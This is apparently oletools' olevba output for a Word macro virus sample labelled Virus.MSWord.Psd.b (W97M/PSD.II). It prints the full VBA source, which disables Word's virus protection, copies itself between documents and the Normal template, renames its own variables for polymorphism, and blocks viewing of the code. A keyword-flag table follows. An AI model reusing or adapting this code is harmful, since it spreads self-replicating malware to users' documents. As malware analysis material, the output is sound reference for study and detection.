olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-c60fe4154b0e684c7d3e2e007eba8a99cdd909bb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-c60fe4154b0e684c7d3e2e007eba8a99cdd909bb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For IA842 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next IA842: End If
JK6170 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
QO9615 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set CB647 = ActiveDocument.VBProject.VBComponents.Item(1)
CP7535 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set CB647 = NormalTemplate.VBProject.VBComponents.Item(1)
VK4570 = True
Call IL135_OH81
ActiveDocument.Saved = True
End If
If VK4570 <> True And CP7535 <> True Then GoTo ET4619
If VK4570 = True Then CB647.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, JK6170 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If CP7535 = True Then CB647.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, QO9615 - 4))
ET4619:
If QO9615 <> 0 And JK6170 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function IL135_OH81()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "VK7968": r1(2) = "VD6175": r1(3) = "JA6319": r1(4) = "TO9939": r1(5) = "OH81": r1(6) = "JK6170"
r1(7) = "QO9615": r1(8) = "CP7535":: r1(9) = "CB647": r1(10) = "VK4570": r1(11) = "ET4619": r1(12) = "IL135": r1(13) = "QI3136": r1(14) = "EO5256": r1(15) = "IA842"
For IA842 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call OH81(a1, r1(IA842))
Next IA842
End Function 'VAMP v1.0 [thanks Vic!]
Private Function OH81(EO5256, QI3136 As String)
On Error Resume Next
Dim VK7968 As Long: Dim VD6175 As Long: Dim JA6319 As Long: Dim TO9939 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
VK7968 = 1: VD6175 = 1: JA6319 = .CountOfLines: TO9939 = Len(.Lines(.CountOfLines, 1))
Do While .Find(QI3136, VK7968, VD6175, JA6319, TO9939, True)
strline = .Lines(VK7968, 1)
strline = Left(strline, VD6175 - 1) & EO5256 & Mid(strline, TO9939)
.replaceline VK7968, strline
VK7968 = JA6319 + 1: VD6175 = 1:
JA6319 = .CountOfLines
TO9939 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

